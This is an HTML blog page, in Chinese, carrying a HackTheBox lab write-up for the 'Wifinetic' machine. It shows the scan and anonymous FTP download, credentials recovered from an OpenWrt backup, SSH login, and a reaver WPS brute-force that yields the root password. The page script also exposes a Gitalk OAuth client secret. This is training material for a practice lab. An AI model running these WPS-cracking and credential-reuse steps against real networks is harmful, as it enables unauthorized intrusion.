@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Wifinetic - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Wifinetic 10.10.11.247                                                                                                              赛季休赛期,piece of cake 端口扫描21,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Wifinetic - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Wifinetic 10.10.11.247                                                                                                              赛季休赛期,piece of cake 端口扫描21,">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091801.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091802.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091803.jpg">
+<meta property="article:published_time" content="2023-09-13T06:13:15.000Z">
+<meta property="article:modified_time" content="2023-09-18T06:15:03.812Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091801.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                Twitter
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://darkwing.moe/2015/01/01/about/"  >
+                <i class="icon icon-lg icon-link"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Wifinetic - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Wifinetic - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-09-13T06:13:15.000Z" itemprop="datePublished" class="page-time">
+  2023-09-13
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#FTP"><span class="post-toc-number">3.</span> <span class="post-toc-text">FTP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#backup-OpenWrt-2023-07-26-tar"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">backup-OpenWrt-2023-07-26.tar</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">4.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">5.</span> <span class="post-toc-text">提权信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WPA暴力破解"><span class="post-toc-number">6.</span> <span class="post-toc-text">WPA暴力破解</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">7.</span> <span class="post-toc-text">root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">8.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Wifinetic-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Wifinetic - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-09-13 14:13:15" datetime="2023-09-13T06:13:15.000Z"  itemprop="datePublished">2023-09-13</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><a href="https://app.hackthebox.com/machines/Wifinetic" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Wifinetic</a></li>
+<li>10.10.11.247</li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>赛季休赛期,piece of cake</p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>21,22和53:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.247</span></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-18 13:45 CST</span><br><span class="line">Nmap scan report for 10.10.11.247</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE    VERSION</span><br><span class="line">21/tcp open  ftp        vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt</span><br><span class="line">| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf</span><br><span class="line">| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf</span><br><span class="line">| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar</span><br><span class="line">|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.16.9</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)</span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</span><br><span class="line">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</span><br><span class="line">53/tcp open  tcpwrapped</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 46.38 seconds</span><br></pre></td></tr></table></figure>
+
+<h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p>FTP匿名访问，下载所有文件:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lftp 10.10.11.247</span></span><br><span class="line">lftp 10.10.11.247:~&gt; ls</span><br><span class="line">-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf</span><br><span class="line">-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf</span><br><span class="line">-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar</span><br><span class="line">-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf</span><br><span class="line">lftp 10.10.11.247:/&gt; mget *</span><br><span class="line">2660407 バイト転送済、8 秒経過 (317.2 KiB/s)</span><br><span class="line">計 5 ファイル転送済</span><br><span class="line">lftp 10.10.11.247:/&gt; exit</span><br></pre></td></tr></table></figure>
+
+<p>得到的几个pdf文件中获得一些信息(也没什么用)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">samantha.wood93@wifinetic.htb</span><br><span class="line">info@wifinetic.htb</span><br><span class="line">olivia.walker17@wifinetic.htb</span><br></pre></td></tr></table></figure>
+
+<h2 id="backup-OpenWrt-2023-07-26-tar"><a href="#backup-OpenWrt-2023-07-26-tar" class="headerlink" title="backup-OpenWrt-2023-07-26.tar"></a>backup-OpenWrt-2023-07-26.tar</h2><p>就是openwrt配置文件的备份，其中可以得到用户名和wifi密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">daemon:*:1:1:daemon:/var:/bin/false</span><br><span class="line">ftp:*:55:55:ftp:/home/ftp:/bin/false</span><br><span class="line">network:*:101:101:network:/var:/bin/false</span><br><span class="line">nobody:*:65534:65534:nobody:/var:/bin/false</span><br><span class="line">ntp:x:123:123:ntp:/var/run/ntp:/bin/false</span><br><span class="line">dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false</span><br><span class="line">logd:x:514:514:logd:/var/run/logd:/bin/false</span><br><span class="line">ubus:x:81:81:ubus:/var/run/ubus:/bin/false</span><br><span class="line">netadmin:x:999:999::/home/netadmin:/bin/false</span><br><span class="line"></span><br><span class="line">cat etc/config/wireless</span><br><span class="line"></span><br><span class="line">option key 'VeRyUniUqWiFIPasswrd1!'</span><br></pre></td></tr></table></figure>
+
+<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的用户名和密码尝试匹配，netadmin可以登录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh netadmin@10.10.11.247</span><br><span class="line">VeRyUniUqWiFIPasswrd1!</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>常规枚举，发现reaver的特权，这是一款WPS破解工具:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netadmin@wifinetic:~$ getcap -r / 2&gt;/dev/null</span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><br><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line">/usr/bin/reaver = cap_net_raw+ep</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Ubuntu Manpage: Reaver - WPS Cracker<br><a href="https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html" target="_blank" rel="noopener">https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html</a></li>
+</ul>
+<p>查看网卡也可以发现处于监听模式的无线网卡wlan2和作为AP的wlan0：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">netadmin@wifinetic:~$ iw dev</span><br><span class="line"><span class="meta">phy#</span><span class="bash">2</span></span><br><span class="line">	Interface mon0</span><br><span class="line">		ifindex 7</span><br><span class="line">		wdev 0x200000002</span><br><span class="line">		addr 02:00:00:00:02:00</span><br><span class="line">		type monitor</span><br><span class="line">		txpower 20.00 dBm</span><br><span class="line">	Interface wlan2</span><br><span class="line">		ifindex 5</span><br><span class="line">		wdev 0x200000001</span><br><span class="line">		addr 02:00:00:00:02:00</span><br><span class="line">		type managed</span><br><span class="line">		txpower 20.00 dBm</span><br><span class="line">...</span><br><span class="line"><span class="meta">phy#</span><span class="bash">0</span></span><br><span class="line">        Interface wlan0</span><br><span class="line">                ifindex 3</span><br><span class="line">                wdev 0x1</span><br><span class="line">                addr 02:00:00:00:00:00</span><br><span class="line">                ssid OpenWrt</span><br><span class="line">                type AP</span><br><span class="line">                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz</span><br><span class="line">                txpower 20.00 dBm</span><br></pre></td></tr></table></figure>
+
+<h1 id="WPA暴力破解"><a href="#WPA暴力破解" class="headerlink" title="WPA暴力破解"></a>WPA暴力破解</h1><p>使用reaver来爆破密码:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reaver -i mon0 -b 02:00:00:00:00:00 -vv</span><br><span class="line"></span><br><span class="line">[+] WPS PIN: '12345670'</span><br><span class="line">[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'</span><br></pre></td></tr></table></figure>
+
+<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>破解得到的wifi密码就是root密码:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li>Ubuntu Manpage: Reaver - WPS Cracker<br><a href="https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html" target="_blank" rel="noopener">https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html</a></li>
+<li>HTB: Wifinetic | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2023/09/16/htb-wifinetic.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2023/09/16/htb-wifinetic.html</a></li>
+<li>HackThebox - Wifinetic - YouTube<br><a href="https://www.youtube.com/watch?v=jj4r5lwnCp8&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jj4r5lwnCp8&amp;ab_channel=IppSec</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2023-09-18T06:15:03.812Z" itemprop="dateUpdated">2023-09-18 14:15:03</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/&title=《Wifinetic - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/&title=《Wifinetic - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Wifinetic - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2023/09/14/Rebound-HackTheBox/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Rebound - HackTheBox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2023/09/04/CozyHosting-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">CozyHosting - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/&title=《Wifinetic - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/&title=《Wifinetic - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Wifinetic - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/09/13/Wifinetic-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACK0lEQVR42u3aQY7CMAwFUO5/aWY7i2nnfweQSF5WqKQ0r0iWnfjxiMfz17i/kn+b3PXigYGB8bWM5+1oGVeLuJ+fPPdqDgYGxjmMqwcnc9rg24b1+7VhYGBgXM15liNfLgYGBsY6Iwmy97/fJqAYGBgYeTHZLi4PtR+txTEwML6Qke+6f/7zW843MDAwvooxK0TXP9+H73pVGBgYWzPyAJc8/r5AbRPEej0YGBibMvLmiTzstk1jbTj+4woGBsYBjLxoXCk7Vzba/sFgYGBszWhbvmblaHJc2iaXj+hUEwMDYwdG2zYxA8zebvEUDAyMYxhJiJwVrrN2sbyBAwMDY2/G7FhxfU5eBhcvAgMDY2tGHv5eVei2Cy3WhoGBsSmjTeaKdG209GEbBwYGxqaMfIMsT+Pa4nPWbPHHdhsGBsamjJVl5Q0Zs1eQh2AMDIy9GW3ATea3bRPt9Uf+DjAwMLZgzArI/BB0dtdb/iUMDIxNGUutD6Ot/1mbLAYGxgmMtkki37jPk8U8BF/OwcDAOIAx29DPS9zZKyiOOTEwMI5htJtxr00E2xQTAwPjBMazHG3S1t6VpI//5LYYGBjbMdrTwFkjRbtxliy9DdYYGBjfzpi1VrRhdKWgHR5YYmBgbMdYL2Lz+W2wjpAYGBgYo6Jx1jSW45cCLgYGxgGMPPmbFah5+oiBgXEOI28knaWA+TFA2+qBgYFxAqPdy8rL0dnxZF64YmBgHMD4AZ4PIuBvIxg5AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
